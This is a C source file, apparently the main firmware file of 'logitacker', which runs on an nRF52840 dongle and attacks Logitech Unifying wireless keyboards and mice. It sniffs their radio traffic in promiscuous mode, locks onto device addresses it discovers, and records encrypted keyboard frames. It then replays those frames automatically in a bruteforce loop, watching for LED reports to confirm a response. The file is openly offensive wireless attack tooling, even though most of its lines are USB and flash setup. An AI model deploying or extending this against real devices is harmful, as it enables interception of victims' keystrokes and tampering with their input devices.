#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

#include "nrf.h"
#include "nrf_esb_illegalmod.h"
#include "nrf_esb_illegalmod_error_codes.h"
#include "nrf_delay.h"
#include "nrf_drv_usbd.h"
#include "nrf_drv_clock.h"
#include "nrf_gpio.h"
#include "nrf_drv_power.h"

#include "app_timer.h"
#include "app_usbd.h"
#include "app_usbd_core.h"
#include "app_usbd_hid_generic.h"
#include "app_usbd_hid_mouse.h"
#include "app_usbd_hid_kbd.h"
#include "app_error.h"
#include "bsp.h"

#include "app_usbd_cdc_acm.h"
#include "app_usbd_serial_num.h"

// LOG
#include "nrf_log.h"
#include "nrf_log_ctrl.h"
#include "nrf_log_default_backends.h"

//CLI
#include "nrf_cli.h"
#include "nrf_cli_cdc_acm.h"

#include "app_scheduler.h"

//Flash FDS
#include <string.h>
#include "fds.h"
#include "flash_device_info.h"
#include "state.h"
#include "unifying.h"
#include "hid.h"
#include "logitacker_radio.h"

#include "led_rgb.h"

#include "timestamp.h"

#include "logitacker.h"

#define CHANNEL_HOP_RESTART_DELAY 1300

// Scheduler settings
#define SCHED_MAX_EVENT_DATA_SIZE   BYTES_PER_WORD*BYTES_TO_WORDS(MAX(NRF_ESB_CHECK_PROMISCUOUS_SCHED_EVENT_DATA_SIZE,MAX(APP_TIMER_SCHED_EVENT_DATA_SIZE,MAX(sizeof(nrf_esb_payload_t),MAX(sizeof(unifying_rf_record_set_t),sizeof(nrf_esb_evt_t))))))


#define SCHED_QUEUE_SIZE            16

/**
 * @brief Enable USB power detection
 */
#ifndef USBD_POWER_DETECTION
#define USBD_POWER_DETECTION false
#endif


#define BTN_TRIGGER_ACTION   0

    bool report_frames_without_crc_match = true; // if enabled, invalid promiscuous mode frames are pushed through as USB HID reports
    bool switch_from_promiscous_to_sniff_on_discovered_address = true; // if enabled, the dongle automatically toggles to sniffing mode for captured addresses
#ifdef NRF52840_MDK
    bool with_log = true;
#else
    bool with_log = false;
#endif


#define AUTO_BRUTEFORCE true
static bool continue_frame_recording = true;
static bool enough_frames_recorded = false;
static bool continuo_redording_even_if_enough_frames = false;

uint32_t m_act_led = LED_B;
uint32_t m_channel_scan_led = LED_G;

/*
enum {
    BSP_USER_EVENT_RELEASE_0 = BSP_EVENT_KEY_LAST + 1, 
    BSP_USER_EVENT_LONG_PRESS_0,                          
};
*/

// created HID report descriptor with vendor define output / input report of max size in raw_desc
APP_USBD_HID_GENERIC_SUBCLASS_REPORT_DESC(raw_desc,APP_USBD_HID_RAW_REPORT_DSC_SIZE(REPORT_OUT_MAXSIZE));
// add created HID report descriptor to subclass descriptor list
static const app_usbd_hid_subclass_desc_t * reps[] = {&raw_desc};
// setup generic HID interface 
APP_USBD_HID_GENERIC_GLOBAL_DEF(m_app_hid_generic,
                                HID_GENERIC_INTERFACE,
                                usbd_hid_event_handler,
                                ENDPOINT_LIST(),
                                reps,
                                REPORT_IN_QUEUE_SIZE,
                                REPORT_OUT_MAXSIZE,
                                APP_USBD_HID_SUBCLASS_BOOT,
                                APP_USBD_HID_PROTO_GENERIC);

// internal state
struct
{
    int16_t counter;    /**< Accumulated x state */
    int16_t lastCounter;
}m_state;

static bool m_report_pending; //Mark ongoing USB transmission



static uint8_t hid_out_report[REPORT_OUT_MAXSIZE];
static bool processing_hid_out_report = false;
/**
 * @brief Class specific event handler.
 *
 * @param p_inst    Class instance.
 * @param event     Class specific event.
 * */
static void usbd_hid_event_handler(app_usbd_class_inst_t const * p_inst,
                                app_usbd_hid_user_event_t event)
{
    //helper_log_priority("usbd_hid_event_handler");
    switch (event)
    {
        case APP_USBD_HID_USER_EVT_OUT_REPORT_READY:
        {
            size_t out_rep_size = REPORT_OUT_MAXSIZE;
            const uint8_t* out_rep = app_usbd_hid_generic_out_report_get(&m_app_hid_generic, &out_rep_size);
            memcpy(&hid_out_report, out_rep, REPORT_OUT_MAXSIZE);
            processing_hid_out_report = true;
            break;
        }
        case APP_USBD_HID_USER_EVT_IN_REPORT_DONE:
        {
            m_report_pending = false;
            break;
        }
        case APP_USBD_HID_USER_EVT_SET_BOOT_PROTO:
        {
            UNUSED_RETURN_VALUE(hid_generic_clear_buffer(p_inst));
            NRF_LOG_INFO("SET_BOOT_PROTO");
            break;
        }
        case APP_USBD_HID_USER_EVT_SET_REPORT_PROTO:
        {
            UNUSED_RETURN_VALUE(hid_generic_clear_buffer(p_inst));
            NRF_LOG_INFO("SET_REPORT_PROTO");
            break;
        }
        default:
            break;
    }
}

/**
 * @brief USBD library specific event handler.
 *
 * @param event     USBD library event.
 * */
static void usbd_user_ev_handler(app_usbd_event_type_t event)
{
    //runs in thread mode
    switch (event)
    {
        case APP_USBD_EVT_DRV_SOF:
            break;
        case APP_USBD_EVT_DRV_RESET:
            m_report_pending = false;
            break;
        case APP_USBD_EVT_DRV_SUSPEND:
            m_report_pending = false;
            app_usbd_suspend_req(); // Allow the library to put the peripheral into sleep mode
            bsp_board_led_off(LED_R);
            break;
        case APP_USBD_EVT_DRV_RESUME:
            m_report_pending = false;
            bsp_board_led_on(LED_R);
            break;
        case APP_USBD_EVT_STARTED:
            m_report_pending = false;
            bsp_board_led_on(LED_R);
            break;
        case APP_USBD_EVT_STOPPED:
            app_usbd_disable();
            bsp_board_led_off(LED_R);
            break;
        case APP_USBD_EVT_POWER_DETECTED:
            NRF_LOG_INFO("USB power detected");
            if (!nrf_drv_usbd_is_enabled())
            {
                app_usbd_enable();
            }
            break;
        case APP_USBD_EVT_POWER_REMOVED:
            NRF_LOG_INFO("USB power removed");
            app_usbd_stop();
            break;
        case APP_USBD_EVT_POWER_READY:
            NRF_LOG_INFO("USB ready");
            app_usbd_start();
            break;
        default:
            break;
    }
}

/*
// handle event (press of physical dongle button)
static bool long_pushed;
static void bsp_event_callback(bsp_event_t ev)
{
    // runs in interrupt mode
    //helper_log_priority("bsp_event_callback");
    //uint32_t ret;
    switch ((unsigned int)ev)
    {
        case CONCAT_2(BSP_EVENT_KEY_, BTN_TRIGGER_ACTION):
            //Toggle radio back to promiscous mode
            bsp_board_led_on(LED_B);
            break;

        case BSP_USER_EVENT_LONG_PRESS_0:
            long_pushed = true;
            NRF_LOG_INFO("Button long pressed, falling back to promiscuous mode...")

            while (nrf_esb_stop_rx() != NRF_SUCCESS) {};

            nrf_esb_set_mode(NRF_ESB_MODE_PROMISCOUS); //set back to promiscous
            radio_enable_rx_timeout_event(CHANNEL_HOP_RESTART_DELAY); //produce event if there's no RX in given time

            nrf_esb_start_rx();

            // re-enable frame recording
            continue_frame_recording = true;

            bsp_board_led_off(m_channel_scan_led);
            m_act_led = LED_G;
            m_channel_scan_led = LED_B;
            
            break;

        case BSP_USER_EVENT_RELEASE_0:
            if (long_pushed) {
                long_pushed = false;
                break; // don't act if there was already a long press event
            }
            NRF_LOG_INFO("Button pressed")

            // if enough frames recorded, replay
            if (enough_frames_recorded) {
                uint8_t pipe = 1;
                NRF_LOG_INFO("replay recorded frames for pipe 1");
                unifying_replay_records(pipe, false, UNIFYING_REPLAY_KEEP_ALIVES_TO_INSERT_BETWEEN_TX);
            }
            break;

        default:
            return; // no implementation needed
    }
}


static void init_bsp(void)
{
    ret_code_t ret;
    ret = bsp_init(BSP_INIT_BUTTONS, bsp_event_callback);
    APP_ERROR_CHECK(ret);
    bsp_event_to_button_action_assign(BTN_TRIGGER_ACTION, BSP_BUTTON_ACTION_RELEASE, BSP_USER_EVENT_RELEASE_0);
    bsp_event_to_button_action_assign(BTN_TRIGGER_ACTION, BSP_BUTTON_ACTION_LONG_PUSH, BSP_USER_EVENT_LONG_PRESS_0);

    // Configure LEDs 
    bsp_board_init(BSP_INIT_LEDS);
}
*/

static ret_code_t idle_handle(app_usbd_class_inst_t const * p_inst, uint8_t report_id)
{
    switch (report_id)
    {
        case 0:
        {
            //uint8_t report[] = {0xBE, 0xEF};
            uint8_t report[] = {};
            return app_usbd_hid_generic_idle_report_set(&m_app_hid_generic, report, sizeof(report));
        }
        default:
            return NRF_ERROR_NOT_SUPPORTED;
    }
    
}

/*
* ESB
*/
static nrf_esb_payload_t * m_current_payload = NULL;
void esb_process_unvalidated_promiscuous() {
    if (m_current_payload == NULL) return;

    if (report_frames_without_crc_match) {
        static uint8_t report[REPORT_IN_MAXSIZE];

        memset(report,0,REPORT_IN_MAXSIZE);
        report[0] = m_current_payload->pipe;
        memcpy(&report[2], m_current_payload->data, m_current_payload->length);
        app_usbd_hid_generic_in_report_set(&m_app_hid_generic, report, sizeof(report));
        bsp_board_led_invert(m_act_led); // toggle green to indicate received RF data from promiscuous sniffing
    }
}

void esb_process_valid_promiscuous() {
    if (m_current_payload == NULL) return;
    if (!m_current_payload->validated_promiscuous_frame) return;

    static uint8_t report[REPORT_IN_MAXSIZE];

    bsp_board_led_invert(m_act_led); // toggle green to indicate valid ESB frame in promiscous mode
    memset(report,0,REPORT_IN_MAXSIZE);
    memcpy(report, m_current_payload->data, m_current_payload->length);
    app_usbd_hid_generic_in_report_set(&m_app_hid_generic, report, sizeof(report));

    // assign discovered address to pipe 1 and switch over to passive sniffing (doesn't send ACK payloads)
    if (switch_from_promiscous_to_sniff_on_discovered_address) {
        m_act_led = LED_B;
        m_channel_scan_led = LED_G;
        uint8_t RfAddress1[4] = {m_current_payload->data[5], m_current_payload->data[4], m_current_payload->data[3], m_current_payload->data[2]}; //prefix, addr3, addr2, addr1, addr0
        NRF_LOG_INFO("Received valid frame from %02x:%02x:%02x:%02x:%02x, sniffing this address", RfAddress1[3], RfAddress1[2], RfAddress1[1], RfAddress1[0], m_current_payload->data[6])

        bsp_board_leds_off();

        radio_stop_channel_hopping();
        radio_enable_rx_timeout_event(1300);

        nrf_esb_stop_rx();
        
        nrf_esb_set_mode(NRF_ESB_MODE_SNIFF);
        nrf_esb_set_base_address_1(RfAddress1);
        nrf_esb_update_prefix(1, m_current_payload->data[6]);   
        while (nrf_esb_start_rx() != NRF_SUCCESS) {};
    } else {
        uint8_t RfAddress1[4] = {m_current_payload->data[5], m_current_payload->data[4], m_current_payload->data[3], m_current_payload->data[2]}; //prefix, addr3, addr2, addr1, addr0
        NRF_LOG_INFO("Received valid frame from %02x:%02x:%02x:%02x:%02x, go on with promiscuous mode anyways", RfAddress1[3], RfAddress1[2], RfAddress1[1], RfAddress1[0], m_current_payload->data[6])
    }
}

void nrf_esb_process_rx() {
    static nrf_esb_payload_t rx_payload;

    // we check current channel here, which isn't reliable as the frame from fifo could have been received on a
    // different one, but who cares
    uint32_t ch = 0;
    nrf_esb_get_rf_channel(&ch);


    static uint8_t report[REPORT_IN_MAXSIZE];
    switch (nrf_esb_get_mode()) {
        case NRF_ESB_MODE_PROMISCOUS:
            // pull RX payload from fifo, till no more left
            while (nrf_esb_read_rx_payload(&rx_payload) == NRF_SUCCESS) {
                m_current_payload = &rx_payload;
                if (m_current_payload->validated_promiscuous_frame) {
                    NRF_LOG_INFO("main thread valid promisc frame");
                    esb_process_valid_promiscuous();
                } else {
                    //NRF_LOG_INFO("main thread UNVALIDATED promisc frame");
                    //NRF_LOG_HEXDUMP_INFO(m_current_payload->data, m_current_payload->length);
                    esb_process_unvalidated_promiscuous();
                }

            }
            break;
        case NRF_ESB_MODE_PTX: // process RX frames with ack payload in PTX mode
        case NRF_ESB_MODE_SNIFF:
            // pull RX payload from fifo, till no more left
            while (nrf_esb_read_rx_payload(&rx_payload) == NRF_SUCCESS) {
                if (rx_payload.length == 0) bsp_board_led_invert(m_act_led); // toggle act led to indicate non-empty frame sniffed
                
                uint8_t rfReportType;
                bool rfReportIsKeepAlive;
                unifying_frame_classify_log(rx_payload);
                unifying_frame_classify(rx_payload, &rfReportType, &rfReportIsKeepAlive);
                switch (rfReportType) {
                    case UNIFYING_RF_REPORT_SET_KEEP_ALIVE:
                    case UNIFYING_RF_REPORT_ENCRYPTED_KEYBOARD:
                    {
                        // record frames, till enough received
                        if (continue_frame_recording) {
                            unifying_record_rf_frame(rx_payload);
                        }
                        break;
                    }
                    
                    default:
                        break;
                }

                bsp_board_led_off(m_channel_scan_led); //assure LED indicating channel hops is disabled

                // hid report:
                // byte 0:    rx pipe
                // byte 1:    ESB payload length
                // byte 2..6: RF address on pipe (account for addr_len when copying over)
                // byte 7:    reserved, would be part of PCF in promiscuous mode (set to 0x00 here)
                // byte 8..:  ESB payload

                memset(report,0,REPORT_IN_MAXSIZE);
                report[0] = rx_payload.pipe;
                report[1] = rx_payload.length;
                nrf_esb_convert_pipe_to_address(rx_payload.pipe, &report[2]);
                memcpy(&report[8], rx_payload.data, rx_payload.length);
                
                app_usbd_hid_generic_in_report_set(&m_app_hid_generic, report, sizeof(report));
            }
            break;
        default:
            break;
    }
    
}

void nrf_esb_event_handler(nrf_esb_evt_t *p_event) {
    if (unifying_process_esb_event(p_event)) return;
    //helper_log_priority("nrf_esb_event_handler");
    switch (p_event->evt_id)
    {
        case NRF_ESB_EVENT_TX_SUCCESS:
            NRF_LOG_DEBUG("nrf_esb_event_handler TX_SUCCESS");
            break;
        case NRF_ESB_EVENT_TX_FAILED:
            NRF_LOG_DEBUG("nrf_esb_event_handler TX_FAILED");
            break;
        case NRF_ESB_EVENT_RX_RECEIVED:
            if (nrf_esb_is_in_promiscuous_mode()) {
                NRF_LOG_DEBUG("promiscuous frame event received");
            }
            nrf_esb_process_rx();
            break;
    }
}

void clocks_start( void )
{
    NRF_CLOCK->EVENTS_HFCLKSTARTED = 0;
    NRF_CLOCK->TASKS_HFCLKSTART = 1;

    while (NRF_CLOCK->EVENTS_HFCLKSTARTED == 0);
}

/* FDS */
static dongle_state_t m_dongle_state = {
    .boot_count = 0,
    .device_info_count = 0,
};


// current device info
static device_info_t m_current_device_info =
{
    .RfAddress = {0x75, 0xa5, 0xdc, 0x0a, 0xbb}, //prefix, addr3, addr2, addr1, addr0
};

// Flag to check fds initialization.
static bool volatile m_fds_initialized;

// Keep track of the progress of a delete_all operation. 
static struct
{
    bool delete_next;   //!< Delete next record.
    bool pending;       //!< Waiting for an fds FDS_EVT_DEL_RECORD event, to delete the next record.
} m_delete_all;


// Sleep until an event is received.
static void power_manage(void)
{
    __WFE();
}


static void wait_for_fds_ready(void)
{
    while (!m_fds_initialized)
    {
        power_manage();
    }
}

static void fds_evt_handler(fds_evt_t const * p_evt)
{
    // runs in thread mode
    //helper_log_priority("fds_evt_handler");
    switch (p_evt->id)
    {
        case FDS_EVT_INIT:
            if (p_evt->result == FDS_SUCCESS)
            {
                m_fds_initialized = true;
            }
            break;

        case FDS_EVT_WRITE:
        {
            if (p_evt->result == FDS_SUCCESS)
            {
                NRF_LOG_INFO("Record ID:\t0x%04x",  p_evt->write.record_id);
                NRF_LOG_INFO("File ID:\t0x%04x",    p_evt->write.file_id);
                NRF_LOG_INFO("Record key:\t0x%04x", p_evt->write.record_key);
            }
        } break;

        case FDS_EVT_DEL_RECORD:
        {
            if (p_evt->result == FDS_SUCCESS)
            {
                NRF_LOG_INFO("Record ID:\t0x%04x",  p_evt->del.record_id);
                NRF_LOG_INFO("File ID:\t0x%04x",    p_evt->del.file_id);
                NRF_LOG_INFO("Record key:\t0x%04x", p_evt->del.record_key);
            }
            m_delete_all.pending = false;
        } break;

        default:
            break;
    }
}

bool m_auto_bruteforce_started = false;

uint8_t m_replay_count;
void unifying_event_handler(unifying_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case UNIFYING_EVENT_REPLAY_RECORDS_FAILED:
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_REPLAY_RECORDS_FAILED");
            radio_enable_rx_timeout_event(CHANNEL_HOP_RESTART_DELAY); // timeout event if no RX

            // restart failed replay bruteforce
            if (!unifying_replay_records_LED_bruteforce_done(p_event->pipe)) {
                unifying_replay_records(p_event->pipe, false, UNIFYING_REPLAY_KEEP_ALIVES_TO_INSERT_BETWEEN_TX);
            }

            break;
        case UNIFYING_EVENT_REPLAY_RECORDS_FINISHED:
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_REPLAY_RECORDS_FINISHED");

            // restart replay with bruteforce iteration, if not all records result in LED reports for response
            if (!unifying_replay_records_LED_bruteforce_done(p_event->pipe)) {
                m_replay_count++;
                if (m_replay_count == REPLAYS_BEFORE_BRUTEFORCE_ITERATION) {
                    NRF_LOG_INFO("Applying next bruteforce iteration to keyboard frames")
                    unifying_replay_records_LED_bruteforce_iteration(p_event->pipe);
                    m_replay_count = 0;
                }

                unifying_replay_records(p_event->pipe, false, UNIFYING_REPLAY_KEEP_ALIVES_TO_INSERT_BETWEEN_TX);
            } else {
                radio_enable_rx_timeout_event(CHANNEL_HOP_RESTART_DELAY); // timeout event if no RX
            }
            
            break;
        case UNIFYING_EVENT_REPLAY_RECORDS_STARTED:
            bsp_board_led_invert(LED_R);
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_REPLAY_RECORDS_STARTED");
            radio_stop_channel_hopping();
            break;
        case UNIFYING_EVENT_STORED_SUFFICIENT_ENCRYPTED_KEY_FRAMES:
            NRF_LOG_INFO("Unifying event UNIFYING_EVENT_STORED_SUFFICIENT_ENCRYPTED_KEY_FRAMES");
            bsp_board_led_invert(LED_R);

            enough_frames_recorded = true;

            if (continuo_redording_even_if_enough_frames) continue_frame_recording = true; //go on recording, even if enough frames
            else continue_frame_recording = false; // don't record additional frames

            if (AUTO_BRUTEFORCE && !m_auto_bruteforce_started) {
                uint8_t pipe = 1;
                NRF_LOG_INFO("replay recorded frames for pipe 1");
                unifying_replay_records(pipe, false, UNIFYING_REPLAY_KEEP_ALIVES_TO_INSERT_BETWEEN_TX);
                m_auto_bruteforce_started = true;
            }
            break;
    }
}

void radio_event_handler(radio_evt_t const *p_event) {
    //helper_log_priority("UNIFYING_event_handler");
    switch (p_event->evt_id)
    {
        case RADIO_EVENT_NO_RX_TIMEOUT:
        {
            NRF_LOG_INFO("timeout reached without RX");
            radio_start_channel_hopping(30, 1, true);
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
        {
            //NRF_LOG_INFO("new chanel index %d", p_event->pipe);
            //toggle channel hop led, each time we hit the first channel again (channel index encoded in pipe parameter)
            bsp_board_led_invert(m_channel_scan_led); // toggle scan LED everytime we jumped through all channels 
            break;
        }
        case RADIO_EVENT_CHANNEL_CHANGED:
        {
            NRF_LOG_DEBUG("new chanel index %d", p_event->channel_index);
            break;
        }
    }
}

NRF_CLI_CDC_ACM_DEF(m_cli_cdc_acm_transport);
NRF_CLI_DEF(m_cli_cdc_acm, "logitacker $ ", &m_cli_cdc_acm_transport.transport, '\r', 20);




int main(void)
{
    continue_frame_recording = true;

    // Note: For Makerdiary MDK dongle the button isn't working in event driven fashion (only BSP SIMPLE seems to be 
    // supported). Thus this code won't support button interaction on MDK dongle.

    ret_code_t ret;
    static const app_usbd_config_t usbd_config = {
        .ev_state_proc = usbd_user_ev_handler
    };

    APP_SCHED_INIT(SCHED_MAX_EVENT_DATA_SIZE, SCHED_QUEUE_SIZE);
    
    ret = NRF_LOG_INIT(NULL);
    APP_ERROR_CHECK(ret);


    ret = nrf_drv_clock_init();
    APP_ERROR_CHECK(ret);

    nrf_drv_clock_lfclk_request(NULL);

    while(!nrf_drv_clock_lfclk_is_running())
    {
        /* Just waiting */
    }

    ret = app_timer_init();
    APP_ERROR_CHECK(ret);

    logitacker_init();

    //BSP
  //  init_bsp();

    //FDS
    // Register first to receive an event when initialization is complete.
    (void) fds_register(fds_evt_handler);
    //init
    ret = fds_init();
    APP_ERROR_CHECK(ret);
    // Wait for fds to initialize.
    wait_for_fds_ready();


    //USB
    ret = app_usbd_init(&usbd_config);
    APP_ERROR_CHECK(ret);

    app_usbd_class_inst_t const * class_inst_generic;
    class_inst_generic = app_usbd_hid_generic_class_inst_get(&m_app_hid_generic);

    ret = hid_generic_idle_handler_set(class_inst_generic, idle_handle);
    APP_ERROR_CHECK(ret);

    ret = app_usbd_class_append(class_inst_generic);
    APP_ERROR_CHECK(ret);


    app_usbd_class_inst_t const * class_cdc_acm = app_usbd_cdc_acm_class_inst_get(&nrf_cli_cdc_acm);
    ret = app_usbd_class_append(class_cdc_acm);
    APP_ERROR_CHECK(ret);


    if (with_log) {
        NRF_LOG_DEFAULT_BACKENDS_INIT();  
    } 

    /* CLI configured as NRF_LOG backend */
    ret = nrf_cli_init(&m_cli_cdc_acm, NULL, true, true, NRF_LOG_SEVERITY_INFO);
    APP_ERROR_CHECK(ret);
    ret = nrf_cli_start(&m_cli_cdc_acm);
    APP_ERROR_CHECK(ret);


    if (USBD_POWER_DETECTION)
    {
        ret = app_usbd_power_events_enable();
        APP_ERROR_CHECK(ret);
    }
    else
    {
        NRF_LOG_INFO("No USB power detection enabled\r\nStarting USB now");

        app_usbd_enable();
        app_usbd_start();
    }

    //high frequency clock needed for ESB
    clocks_start();

    
    //ESB
    //ret = radioInit(nrf_esb_event_handler_to_scheduler);
    /*
    ret = radioInit(nrf_esb_event_handler, radio_event_handler);
    APP_ERROR_CHECK(ret);
    
    ret = nrf_esb_set_mode(NRF_ESB_MODE_PROMISCOUS);
    APP_ERROR_CHECK(ret);
    nrf_esb_start_rx();
    NRF_LOG_INFO("Start listening for devices in promiscuous mode");


    radio_enable_rx_timeout_event(CHANNEL_HOP_RESTART_DELAY);
    */

    
    unifying_init(unifying_event_handler);
    //ret = nrf_esb_start_rx();
    //if (ret == NRF_SUCCESS) bsp_board_led_on(BSP_BOARD_LED_3);
        

    //FDS
// ToDo: Debuf fds usage on pca10059
#ifndef BOARD_PCA10059
    restoreStateFromFlash(&m_dongle_state);

    //Try to load first device info record from flash, create if not existing
    ret = restoreDeviceInfoFromFlash(0, &m_current_device_info);
    if (ret != FDS_SUCCESS) {
        // restore failed, update/create record on flash with current data
        updateDeviceInfoOnFlash(0, &m_current_device_info); //ignore errors
    } 
#endif


    timestamp_init();

    while (true)
    {
        app_sched_execute();
        //while (app_usbd_event_queue_process()) { }
        nrf_cli_process(&m_cli_cdc_acm);

        if (processing_hid_out_report) {
            uint8_t command = hid_out_report[1]; //preserve pos 0 for report ID
            uint32_t ch = 0;
            switch (command) {
                case HID_COMMAND_GET_CHANNEL:
                    nrf_esb_get_rf_channel(&ch);
                    hid_out_report[2] = (uint8_t) ch;
                    memset(&hid_out_report[3], 0, sizeof(hid_out_report)-3);
                    app_usbd_hid_generic_in_report_set(&m_app_hid_generic, hid_out_report, sizeof(hid_out_report)); //send back 
                    break;
                case HID_COMMAND_SET_CHANNEL:
                    //nrf_esb_get_rf_channel(&ch);
                    ch = (uint32_t) hid_out_report[2];
                    //nrf_esb_stop_rx();
                    if (nrf_esb_set_rf_channel(ch) == NRF_SUCCESS) {
                        hid_out_report[2] = 0;
                    } else {
                        hid_out_report[2] = -1;
                    }
                    //while (nrf_esb_start_rx() != NRF_SUCCESS) {};
                    
                    memset(&hid_out_report[3], 0, sizeof(hid_out_report)-3);
                    app_usbd_hid_generic_in_report_set(&m_app_hid_generic, hid_out_report, sizeof(hid_out_report)); //send back 
                    break;
                case HID_COMMAND_GET_ADDRESS:
                    hid_out_report[2] = m_current_device_info.RfAddress[4];
                    hid_out_report[3] = m_current_device_info.RfAddress[3];
                    hid_out_report[4] = m_current_device_info.RfAddress[2];
                    hid_out_report[5] = m_current_device_info.RfAddress[1];
                    hid_out_report[6] = m_current_device_info.RfAddress[0];
                    memset(&hid_out_report[7], 0, sizeof(hid_out_report)-7);

                    hid_out_report[8] = (uint8_t) (m_dongle_state.boot_count &0xFF);
                    app_usbd_hid_generic_in_report_set(&m_app_hid_generic, hid_out_report, sizeof(hid_out_report)); //send back 
                    break;
                default:
                    //echo back
                    app_usbd_hid_generic_in_report_set(&m_app_hid_generic, hid_out_report, sizeof(hid_out_report)); //send back copy of out report as in report
                    
            }
            processing_hid_out_report = false;
        }

        UNUSED_RETURN_VALUE(NRF_LOG_PROCESS());
        /* Sleep CPU only if there was no interrupt since last loop processing */
        __WFE();
    }
}
